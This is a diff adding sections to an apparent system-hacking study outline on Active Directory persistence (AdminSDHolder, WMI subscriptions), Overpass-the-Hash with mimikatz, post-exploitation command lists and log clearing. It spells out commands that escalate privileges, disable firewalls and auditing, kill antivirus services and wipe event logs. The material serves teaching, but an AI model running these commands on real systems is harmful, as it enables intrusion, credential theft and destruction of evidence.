@@ -966,3 +966,164 @@ Use Different Techniques to Conceal Malicious Programs and Maintain Remote Acces
 					- Note: Privilege Attribute Certificate (PAC) validation requests and PAC validation responses are optional in a silver ticket attack.
 					- If an attacker successfully elevates privileges and obtains admin rights to execute code on a local machine, they can run the following command to retrieve the NTLM hashes of the AD system’s password:
 					- mimikatz “privilege::debug” “sekurlsa::logonpasswords”
+	- Maintain Domain Persistence Through AdminSDHolder:
+		- AdminSDHolder is an object in Active Directory that protects user accounts and groups with high privileges from accidental modifications to security permissions. Attackers with admin privileges on a compromised domain can abuse the SDProp process to establish persistence. They can add a user account to the ACL to gain "GenericAll" privileges, which are equivalent to the privileges of a domain administrator.\
+		- Establishing Domain Persistence by Abusing AdminSDHolder:
+			- Add user account Martin to the ACL:
+				- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Martin -Verbose -Rights All
+			- SDProp process retrieves the ACL to check whether the Martin account has “GenericAll” permissions:
+				- Get-ObjectAcl -SamAccountName "Martin” -ResolveGUIDs
+			- Change the default time of SDProp to 3 min by modifying the registry:
+				- REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300
+			- Add the account Martin to the group Domain Admins using the following command:
+				- net group “Domain Admins” Martin /add /domain
+			- Check the accessibility of the domain controller (DC) through which domain persistence is created:
+				- dir \\10.10.1.22\c$
+	- Maintaining Persistence Through WMI Event Subscription:
+		- Attackers exploit Windows Management Instrumentation (WMI) event subscriptions to execute malicious content and establish persistence on a target system. By leveraging various scripts and techniques, they manipulate WMI's features to create event subscriptions for malicious triggers. When these events occur, they initiate the execution of arbitrary code, enabling attackers to maintain persistence. These scripts further automate the process by concealing malicious payloads and ensuring persistence, even after the system is rebooted or restarted.
+		- Techniques to Maintain Persistence Using WMI Event Subscription:
+			- Using Command Prompt:
+				- Use wmic commands create a malicious namespace and subscription for the events:
+					- eSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+					- wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", ExecutablePath="C:\Windows\System32\ethicalhacker.exe",CommandLin eTemplate="C:\Windows\System32\thicalhacker.exe"
+					- wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""
+				- The malicious payload is designed to automatically execute within 60 seconds of every system restart, establishing a Meterpreter session with the attacker.
+			- Using Wmi-Persistence:
+				- Attackers also utilize Wmi-Persistence, a PowerShell script, to perform WMI event subscriptions and achieve persistence. This script triggers various actions, including Startup, Logon, Interval, and Timed events, enabling attackers to execute multiple functions such as the installation, review, and removal of WMI event subscriptions.
+				- Execute malicious payload on the compromised system and achieve persistence:
+				- Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"
+				- The above command includes a Startup trigger that executes the specified payload within 5 minutes of a system reboot, establishing a Meterpreter session with the attacker.
+			- Using PowerLurk:
+				- PowerLurk is a PowerShell toolset for creating malicious WMI event subscriptions. The goal of PowerLurk is to simplify the process of triggering WMI events during penetration tests or red-team engagements. Attackers use PowerLurk to create malicious WMI event subscriptions that execute arbitrary payloads on every Windows logon. This script can trigger events such as InsertUSB, UserLogon, Timed, Interval, and ProcessStart.
+				- Import the PowerLurk script to a local instance: Import-Module .\PowerLurk.ps1
+				- Identify all the active WMI event objects: Get-WmiEvent
+				- Create a malicious event subscription that executes the malicious payload and creates a Meterpreter session:
+				- Register-MaliciousWmiEvent -EventName Logonlog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any
+	- Overpass-the-Hash Attack:
+		- The Overpass-the-Hash (OPtH) attack is an extension of the Pass-the-Ticket and Pass-the-Hash attacks. It is a type of credential theft-and-reuse attack that allows attackers to perform malicious activities on compromised devices or within a compromised environment. The primary goal of an OPtH attack is to acquire Kerberos tickets using the NTLM hash of different user accounts.
+		- Mimikatz to perform OPtH attacks:
+			- The Mimikatz tool allows attackers to obtain and store various authentication credentials, such as Kerberos tickets. It aids attackers in stealing credentials and performing privilege escalation.
+			- Perform the attack and obtain AES128, NTLM (RC4), and AES256 keys for a Kerberos ticket:
+				- privilege::debug
+				- sekurlsa::ekeys
+	- Linux Post-Exploitation:
+		- After compromising a target system and gaining shell access, attackers typically attempt further exploitation to gain full access to additional resources and establish long-term persistence.
+		- File-System Commands:
+			- Discovers SUID-executable binaries: find / -perm -3000 -ls 2> /dev/null
+			- Discovers world-writable files : find / -path /sys -prune -o -path /proc -prune -o -type f -perm -o=w - ls 2> /dev/null
+			- Disables write access to a file : chmod o-w file
+			- Discovers world-writable directories : find / -path /sys -prune -o -path /proc -prune -o -type d -perm -o=w - ls 2> /dev/null
+			- Discovers .txt files on the system : find / -name "*.txt" -ls 2> /dev/null
+			- Displays the list of permitted and forbidden commands : sudo -l
+			- Displays all certificates’ details : openssl s_client -connect <hostname>:<port> -showcerts
+			- Displays contents of keystore files and alias names : keytool -list -v -keystore keystore.jks
+		- Information-Gathering Commands:
+			- Displays the current process along with its process ID (PID) : ps -ef
+			- Attaches a file system to the directory tree structure : mount
+			- Displays host/network names in numeric form : route -n
+			- Displays network configuration details : /sbin/ifconfig -a
+			- Displays running cron jobs : cat /etc/crontab
+			- Displays the software package used for the specified cron job : ls -la /etc/cron.d
+			- Displays directories that can be exported to NFS clients : cat /etc/exports
+			- Displays the OS version details : cat /etc/redhat* /etc/debian* /etc/*release
+			- Lists bootup services : ls /etc/rc*
+			- Displays all the users who have shell access : egrep -e '/bin/(ba)?sh' /etc/passwd
+			- Displays SSH relationships and login details : cat ~/.ssh/
+			- Display information about the CPU(s) on the machine: cat /proc/cpuinfo
+			- Display information about the system's memory usage: cat /proc/meminfo
+	- Windows Post-Exploitation:
+		- Once attackers compromise a system and gain shell access, they can carry out various malicious activities without the user's knowledge. The primary goal of post-exploitation is to gain full control over the system and maintain persistence over time.
+		- File-System Commands:
+			- Retrieves the directory names with hidden attributes : dir /a:h
+			- Retrieves all the text files : findstr /E ".txt" > txt.txt
+			- Retrieves all the log files : findstr /E ".log" > log.txt
+			- Retrieves all the document files : findstr /E ".doc" > doc.txt
+		- Hash Computing Commands:
+			- Generates MD5 hashes : Get-FileHash <file-name> -a md5
+			- Generates SHA-1 hashes : Get-FileHash <file-name> -a sha1
+			- Retrieves SHA-256 hashes by default : Get-FileHash <file-name>
+		- Registry Commands:
+			- Detects the registry hives for the value “credential” : reg query HKEY_LOCAL_MACHINE/f credential /t REG_SZ /s > hklm_password.txt
+			- Checks whether any package is installed with elevated privileges. If value is "1", the installer uses elevated privileges for installing applications : reg query HKEY_LOCAL_MACHINE\SOFTWARE\P olicies\Microsoft\Windows\I nstaller /v AlwaysInstallElevated > reg_always.txt
+			- Provides a list of all programs to query a registry : reg query HKEY_LOCAL_MACHINE\Software\M icrosoft\Windows\CurrentVer sion\Uninstall >> ListofInstalledPrograms.txt
+		- Scheduler Commands:
+			- Retrieves the scheduled task list : schtasks /query /fo LIST /v > schtasks.txt
+			- Retrieves all currently active processes : tasklist /SVC > tasklist.txt
+		- WMIC Commands:
+			- Reboots Windows : wmic os Primary='TRUE' reboot
+			- Retrieves the service name, path of the executable, etc. : wmic service get name,displayname,pathname,s tartmode > wmic_service.txt
+			- Displays the details of the installed software : wmic /node:"" product get name,version,vendor
+			- Retrieves the processor’s details : wmic cpu get
+			- Retrieves login names and their SIDs : wmic useraccount get name,sid
+		- Net Commands:
+			- Shows domain connection details : net config rdr
+			- Adds a computer to the domain : net computer \\computername /add
+			- Displays the list of computers and networks devices in the domain : net view
+			- Displays the name of the host computer : net view \\host
+			- Helps manage shared resources with the appropriate parameters : net share
+		- Network Commands:
+			- Displays routing tables for the destination : route print or netstat -r command
+			- Shows the ARP table for a specific IP address : arp -a
+			- Displays IP configuration details : ipconfig /all
+			- Retrieves the physical address : getmac
+		- Service Commands:
+			- Lists all the available services : sc queryex type=service state=all
+			- Lists details about the specified service : sc queryex type=service state=all | find /i "Name of the service: myService"
+			- Starts/stops a network service : net start or stop
+			- Displays the current firewall state : netsh firewall show state
+			- Displays firewall settings : netsh firewall show config
+			- Turns off the firewall service for the current profile : etsh advfirewall set currentprofile state off
+			- Turns off the firewall service for all profiles : netsh advfirewall set allprofiles state off
+		- Remote Execution Commands:
+			- Retrieves the PC’s serial number : wmic /node:<IP address> /user:administrator /password:$PASSWORD bios get serialnumber
+			- Terminates services associated with eset : taskkill.exe /S <IP address> /U domain\username /F /FI "eset"
+			- Defines the user context to execute commands : tasklist.exe /S <IP address> /U domain\username
+			- Retrieves all the processes running on the system that are not actually “SYSTEM” : tasklist.exe /S <IP address> /U domain\username /FI "USERNAME eq NT AUTHORITY\SYSTEM" /FI "STATUS eq running"
+		- Sysinternals Commands:
+			- Establishes an interactive CMD with a remote system : psexec -i \\<RemoteSystem> cmd
+			- Copies file.txt from the local machine to a remote computer : psexec -i \\<RemoteSystem> -c file.exe
+			- Retrieves the contents of security keys and SAM : psexec -i -d -s c:\windows\regedit.exe
+			- Displays a remote system’s network information : psexec -i \\<RemoteSystem> ipconfig /all
+		- Authenticated WMI Exec via PowerShell:
+			- Launches a suitable local exploit : msf > use exploit/windows/local/ps_wmi_exec
+			- Displays the list of targets : msf exploit(windows/local/ps_wmi_exec) > show targets
+			- Displays all the available options : msf exploit(windows/local/ps_wmi_exec) > show options
+			- Displays possible payloads : msf exploit(windows/local/ps_wmi_exec) > show payloads
+			- Displays suitable evasion options : msf exploit(windows/local/ps_wmi_exec) > show evasion
+
+
+## Clearing Logs
+- Covering Tracks
+	- Once intruders have successfully gained administrator access to a system, they will attempt to cover their tracks to avoid detection.
+	- Covering tracks is a key stage in system hacking where attackers erase or alter logs, error messages, and system configurations to avoid detection. By manipulating event logs and file attributes, they make it appear as if no compromise occurred, often using rootkits to disable logs. If maintaining long-term access, attackers selectively remove evidence from logs and restore file attributes. Detecting such changes can be difficult, but file hashes can identify tampered files.
+	- Manipulate the log files:
+		- SECEVENT.EVT (security) : failed logins, accessing files without privileges
+		- SYSEVENT.EVT (system) : driver failure, things not operating correctly
+		- APPEVENT.EVT (applications)
+	- Techniques Used for Covering Tracks:
+		- Disabling Auditing:
+			- An attacker disables the auditing features of the target system.
+			- Auditpol : Auditpol displays information about and allows manipulation of audit policies. Auditpol.exe is the command-line utility used to modify audit security settings at the category and sub-category levels. Attackers can use Auditpol to enable or disable security auditing on local or remote systems and adjust audit criteria for various categories of security events.
+			- Enabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:enable /failure:enable
+			- Disabling system auditing: C:\>auditpol /set /category:”system”,”account logon” /success:disable /failure:disable
+			- View defined auditing settings: auditpol /get /category:*
+		- Clearing Logs:
+			- An attacker clears or deletes system log entries related to their activities.
+			- Clear_Event_Viewer_Logs.bat : Clear_Event_Viewer_Logs.bat is a utility used to wipe out the logs on the target system. It deletes the security, system, and application logs to cover the attacker’s tracks.
+			- If the system is compromised with Metasploit, the attacker can use a Meterpreter shell to clear all logs from the Windows system. To do this, the attacker launches the Meterpreter shell prompt from the Metasploit Framework, then types the "clearev" command in the Meterpreter shell prompt and presses Enter. This will initiate the process of wiping out the logs on the target system.
+			- Clear PowerShell logs using Clear-EventLog:
+				- Clear the entries from the PowerShell event log: Clear-EventLog "Windows PowerShell"
+				- Clear specific multiple log types: Clear-EventLog -LogName ODiag, OSession -ComputerName localhost, Server02
+					- This command clears all the log entries in Microsoft Office Diagnostics (ODiag) and Microsoft Office Sessions (OSession) on the local computer and Server02 remote computer.
+				- Clear all the logs on the specified systems, and then display the event log list: Clear-EventLog -LogName application, system -confirm
+			- Clear event logs using wevtutil utility:
+				- Display list of event logs: wevtutil el
+				- Clear the event logs: wevtutil cl <log_name>
+			- Manually Clearing Event Logs:
+				- 
+		- Manipulating Logs : An attacker alters logs to prevent detection and avoid legal consequences.
+		- Covering Tracks on the Network : An attacker employs techniques such as reverse HTTP shells, reverse ICMP tunnels, DNS tunneling, and manipulation of TCP parameters to hide their activities on the network.
+		- Covering Tracks on the OS : An attacker uses NTFS streams to conceal and hide malicious files on the target system.
+		- Deleting Files: An attacker uses command-line tools, such as Cipher.exe, to delete data and prevent its recovery in the future.
+		- Disabling Windows Functionality : An attacker disables Windows features, such as last access timestamps, hibernation, virtual memory, and system restore points, to cover their tracks.
+		- Hiding Artifacts : Attackers conceal their malicious artifacts within legitimate OS artifacts to evade detection.
